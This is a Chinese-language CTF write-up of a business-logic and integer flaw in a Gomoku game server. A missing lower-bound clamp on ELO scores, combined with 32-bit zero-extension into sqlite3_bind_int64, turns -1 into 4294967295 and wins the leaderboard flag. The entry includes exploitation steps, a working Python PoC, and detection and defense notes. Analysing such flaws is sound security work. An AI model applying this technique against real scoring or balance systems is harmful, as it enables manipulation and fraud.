---
id: ctf-pwn-elo-negative-score-zero-extension-leaderboard
title: ELO 积分负分未截断 + 32 位零扩展入库：sqlite3_bind_int64 把 -1 存成 4294967295 登顶排行榜
type: scenario
domain: ctf
path: ctf/pwn
technique: elo-negative-score-zero-extension-sqlite
aliases:
- 鸡爪流高手
- ELO 积分下溢
- 负分未截断
- sqlite3_bind_int64 零扩展
- 4294967295 登顶
- 排行榜越权
- 业务逻辑 pwn
tags:
- pwn
- business-logic
- integer
- sign-extension
- sqlite
- elo
- leaderboard
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:13:02+08:00'
  notes: 已对照原文核对：GAME 协议、cmd 表、reset 分数池、ELO 公式、buggy 更新缺 max(0)、mov edx,eax 零扩展入库 4294967295、五子棋 5,3-5,7 稳赢与 20/20/30/38/7 掉分路径均一致；原文无图片；未实际运行。
---

## 一句话结论

服务端用 ELO 公式结算积分，但“玩家侧”更新函数只对 `old_score <= 9` 做了不扣分特判，没有对 `old_score + delta` 做 `max(...,0)` 截断；当玩家分数降到 10、再输给 7 分对手时得到 `-1`，而入库时 `mov edx, eax; call sqlite3_bind_int64` 把 32 位负数零扩展成 `0x00000000ffffffff`，数据库里存成 4294967295，直接成为排行榜第一并拿到 flag。

## 原理

- 目标是一个自定义二进制协议的五子棋服务：包头 `GAME` + 大端 4 字节总长度 + 1 字节 cmd + payload；cmd=1 取 flag（要求排行榜第一名为 `player`）、cmd=2 查分/排名、cmd=3 排行榜、cmd=4 重置、cmd=5 匹配、cmd=6 看棋盘、cmd=7 落子、cmd=8 认输/空棋盘取消。
- 玩家名固定为 `player`，初始 50 分；`cmd=4` 把其他前 7 名玩家分数重置为 `[50,40,30,20,20,10,2000000]`；`cmd=5` 只随机匹配 `score <= 50` 的对手。
- ELO 结算：
  ```text
  expected = 1 / (1 + 10^((opp - self) / 50))
  delta = round(20 * (actual - expected))   # actual: 1 赢 / 0.5 平 / 0 输
  ```
  正常更新是 `max(old + delta, 0)`；但玩家侧调用的是 buggy 版本：
  ```text
  if (old_score <= 9 && delta < 0) return old_score;
  return old_score + delta;   // 没有 max(..., 0)
  ```
  因此只要 `old_score > 9`、`delta < 0`、`old + delta < 0`，就会返回负数。
- 入库时 `db_update_player_score()` 调用 `sqlite3_bind_int64(stmt, 1, score)`，但 score 通过 32 位寄存器传入：
  ```text
  mov edx, eax
  call sqlite3_bind_int64
  ```
  x86-64 SysV 下写 `edx` 会把 `rdx` 高 32 位清零；`eax = -1 = 0xffffffff` 传到 `sqlite3_bind_int64` 时变成 `0x00000000ffffffff = 4294967295`，负数被零扩展成超大正数。
- 排行榜按 `score DESC` 排序，4294967295 远大于所有 bot（包括 2000000），于是 `player` 成为第一；`cmd=1` 检查第一名名字后返回环境变量中的 flag。
- 利用链需要先把 10 分 bot 打成 7 分：用稳定的五子棋开局 `5,3 → 5,4 → 5,5 → 5,6 → 5,7` 在 x=5 列形成两头冲四，AI 只能堵一头，第五手获胜；玩家 50→53，bot 10→7。随后按 20、20、30、38、7 的顺序连续认输，把玩家从 53 降到 10，最后输给 7 分 bot 得到 -1。
- 根因是“负数未截断 + 有符号 32 位到 64 位的零扩展”；这不是内存破坏，而是业务逻辑与整数类型的组合缺陷。

## 触发条件

- 服务端积分/余额/排名等数值使用有符号 32 位 int 计算，更新时缺少下界截断（`max(...,0)` 或 `if (new < 0) new = 0`）。
- 结算公式允许在特定分差下产生负 delta，且玩家分数可以降到 10 以下仍继续参与匹配。
- 入库/比较时把 32 位 int 传给 64 位 API（`sqlite3_bind_int64`、`int64_t`、`long long`），编译器用 32 位寄存器赋值导致零扩展而非符号扩展。
- 排行榜/权限判断直接使用该数值（分数最高者拿 flag/管理员权限）。
- 攻击者能控制比赛结果或匹配对象（认输、空棋盘取消、刷对手）。

## 利用步骤

1. 逆出协议格式与命令表；确认 `cmd=1` 的取 flag 条件是“排行榜第一名为 player”。
2. 逆出 ELO 公式、reset 固定分数、匹配规则（score <= 50）与玩家侧 buggy 更新函数。
3. 用 `cmd=4` 重置对手池；用 `cmd=5` 匹配，若不是目标分数就用 `cmd=8` 在空棋盘取消（不掉分），反复刷到 10 分 bot。
4. 用稳定开局赢 10 分 bot，制造 7 分 bot，同时把自己打到 53。
5. 依次匹配 20、20、30、38、7 分 bot，每次落一子后 `cmd=8` 认输，把分数降到 10，最后输给 7 分 bot 得到 -1。
6. 查询 `cmd=2`/`cmd=3` 确认分数为 4294967295、排名 1；发 `cmd=1` 取 flag。

## PoC

```python
import re, socket, struct

def recv_exact(s, n):
    d = b""
    while len(d) < n:
        c = s.recv(n - len(d))
        if not c: raise ConnectionError
        d += c
    return d

def cmd(s, c, payload=b""):
    s.sendall(b"GAME" + struct.pack(">I", 9 + len(payload)) + bytes([c]) + payload)
    hdr = recv_exact(s, 9)
    total = struct.unpack(">I", hdr[4:8])[0]
    return recv_exact(s, total - 9).decode()

def match_until(s, target):
    while True:
        body = cmd(s, 5)
        m = re.search(r"Matched\s+(.+)\s+Score=(\d+)\s+You=Black", body)
        if int(m.group(2)) == target:
            return
        cmd(s, 8)          # 空棋盘取消，不掉分

def win_10(s):
    match_until(s, 10)
    for mv in [b"5,3", b"5,4", b"5,5", b"5,6", b"5,7"]:
        if not cmd(s, 7, mv).startswith("Continue"):
            break

def lose_to(s, score):
    match_until(s, score)
    cmd(s, 7, b"0,0")      # 下一手让棋盘非空
    cmd(s, 8)              # 认输

with socket.create_connection((HOST, PORT)) as s:
    cmd(s, 4)              # reset
    win_10(s)              # 50 -> 53, 10-bot -> 7
    for sc in (20, 20, 30, 38, 7):
        lose_to(s, sc)     # 最后 10 -> -1 -> 4294967295
    print(cmd(s, 2))
    print(cmd(s, 1))       # flag
```

## 变体与关联

- **数值类型变体**：32 位 `int` → `int64_t`/`size_t`/`sqlite3_bind_int64`/`long` 的零扩展或符号扩展；`unsigned` 与 `signed` 混用；`abs(INT_MIN)` 溢出。
- **业务变体**：积分、余额、优惠券数量、库存、排名权重；负数或超大值可能绕过“最高分/最多数量”判断。
- **利用变体**：先制造下溢再入库、利用 `max(...,0)` 缺失、利用特殊分差/低分 bot 控制 delta、利用空棋盘取消反复刷匹配。
- **关联**：[[ctf-pwn-hexfloat-strtoull-parser-differential]]（数值解析差异绕过校验）；[[binary-pwn-signed-index-scale-wrap-adjacent-fd]]（有符号索引/缩放溢出）；[[ctf-pwn-negative-index-hidden-slot-encoded-fptr]]（负数下标越界）。
- **边界**：若服务端对分数做 `max(0)` 截断、使用无符号/64 位计算、入库前显式 `int64_t` 符号扩展，或排行榜按字符串/其他字段排序，本路径失效。

## 检测与防御

- **检测**：积分出现负数、4294967295、超过业务上限的异常值；同一玩家频繁空棋盘取消匹配、快速连续认输；排行榜第一名为新注册/固定名玩家。
- **防御**：结算后强制 `score = max(score, 0)` 并设上限；用 64 位有符号类型计算与入库，显式 `int64_t` 转换；对 `sqlite3_bind_int64` 的入参做范围校验。
- **加固**：匹配/结算逻辑放服务端，校验比赛结果与步数；对异常匹配/认输行为限速与告警；排行榜权限判断不要只看单一数值。
